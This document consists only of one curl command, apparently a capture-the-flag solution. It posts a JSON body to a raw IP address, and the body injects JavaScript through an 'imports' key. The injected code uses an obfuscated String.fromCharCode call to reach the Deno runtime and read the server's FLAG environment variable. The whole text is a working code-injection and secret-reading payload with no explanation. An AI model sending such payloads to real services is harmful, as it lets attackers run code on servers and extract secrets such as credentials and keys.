curl -s -X POST http://68.221.178.66:8000/ \
  -H "Content-Type: application/json" \
  -d '{"imports":{"{qqq = globalThis[String.fromCharCode(68,101,110,111)].env.get(\"FLAG\")}":{}}}'
